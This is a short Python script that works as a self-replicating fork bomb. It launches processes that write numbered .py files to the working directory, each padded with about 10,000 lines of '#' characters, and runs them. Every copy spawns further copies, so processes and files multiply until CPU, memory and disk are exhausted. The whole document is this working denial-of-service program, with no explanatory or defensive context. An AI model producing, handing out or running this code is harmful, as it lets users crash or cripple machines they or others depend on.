import random as r
import subprocess as s
import multiprocessing as mp
import os

name = os.path.splitext(os.path.basename(__file__))[0]

randoNum = 60
externalRunAmount = 5
firstRunAmount = 10

contents = f'''
import {name} as m
import random as r
import subprocess as s
import multiprocessing as mp
import os
name = os.path.splitext(os.path.basename(__file__))[0]
def runFile(i):
    filename = "python " + str(i) + ".py"
    s.Popen(filename, shell=False)
def handleFile(i):
    file = os.getcwd() + "\\\\" + str(i) + ".py"
    if not os.path.isfile(file):
        m.writeFile(f"{{i}}.py", m.contents)
    runFile(i)
def main():
    for a in range({externalRunAmount}):
        i = r.randint(0, {randoNum})
        if __name__ == "__main__":
            mp.Process(target=handleFile, args=(i,)).start()
            print(name)
main()
''' + "##################################################\n" * 10000


def writeFile(fileName, contents):
    fileContents = ""
    with open(fileName, 'w') as openFile:
        for i in contents:
            openFile.write(str(i))
            fileContents += str(i)
    print(f"Created {fileName}.py!")


def runFile(i):
    filename = "python " + str(i) + ".py"
    s.Popen(filename, shell=False)


def handleFile(i):
    file = os.getcwd() + "\\" + str(i) + ".py"
    if not os.path.isfile(file):
        writeFile(f"{i}.py", contents)
    runFile(i)


def main():
    for a in range(firstRunAmount):
        i = r.randint(0, randoNum)
        mp.Process(target=handleFile, args=(i,)).start()


if __name__ == "__main__":
    main()
